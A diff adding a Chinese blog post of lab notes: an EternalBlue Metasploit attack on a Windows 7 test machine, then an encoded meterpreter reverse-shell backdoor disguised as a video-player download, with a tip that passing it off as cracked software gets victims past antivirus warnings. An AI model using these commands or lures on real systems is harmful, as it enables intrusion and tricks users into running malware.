@@ -1,0 +1,139 @@
+---
+layout:     post
+title:      "对win7测试机的一次渗透测试实验"
+subtitle:   " \"遵守法律\""
+date:       2023-12-01 12:50:12
+author:     "yangsir"
+header-img: "img/post-bg-2015.jpg"
+catalog: true
+tags:
+    - 笔记
+    - 渗透测试
+
+---
+
+> “Yeah It's on. ”
+
+
+<p id = "build"></p>
+
+《中华人民共和国刑法》
+
+**非法侵入计算机信息系统罪和非法控制计算机信息系统罪**。未经许可侵入他人计算机信息系统或者非法控制他人计算机信息系统，情节严重的，可以被追究刑事责任。
+
+## 正文
+
+一、
+
+测试机系统：linux
+
+靶机：win7专业版 防火墙关闭
+
+工具:eternalblue
+
+
+
+启动metasploit
+
+```
+msfconsole
+```
+
+
+
+搜索模块
+
+```
+search eternalblue
+```
+
+![image-20231130163657662](\img\image-20231130163657662.png)
+
+使用第一个模块
+
+```
+use 0
+```
+
+配置
+
+```
+set RHOSTS 192.168.171.161
+# 要改成靶机的ip
+set target 1
+```
+
+运行
+
+```
+run
+```
+
+
+
+![image-20231130164627425](\img\image-20231130164627425.png)
+
+验证实验
+
+进入命令行
+
+```
+shell
+```
+
+在c盘目录下创建文件 lalala.txt
+
+type nul>lalala.txt
+
+lalala.txt增添内容。。。
+
+echo '。。。' >lalala.txt
+
+
+---
+
+二、社会工程学+shell反弹
+
+实验环境:
+
+靶机：win7 公共网络 防火墙全开
+
+1、生成后门程序
+
+```
+msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.171.151 LPORT=4444 -b "\x00" -e x86/shikata_ga_nai -i 10 -f exe -o /var/www/html/西瓜影音.exe
+```
+
+2、在MSF上启动handler开启监听
+
+```
+ use exploit/multi/handler
+ set payload windows/meterpreter/reverse_tcp
+ set LHOST 192.168.171.151
+ set LPORT 4444
+ run
+```
+
+![image-20231201102437445](\img\image-20231201102437445.png)
+
+3、在kail上启动apache为后门程序提供下载地址
+
+```
+systemctl start apache2
+```
+
+4、打开win7访问搭建的web服务下载执行文件
+
+打开浏览器访问： http://<ip>/西瓜影音.exe
+
+![image-20231201102236515](\img\image-20231201102236515.png)
+
+5、运行文件
+
+你说运行会报病毒？ 那如果它是破解软件、开挂软件或者那个啥呢，无视风险，继续安装？
+
+6、在msf终端查看建立的session
+
+![image-20231201103019373](\img\image-20231201103019373.png)
+
+反弹成功！！！
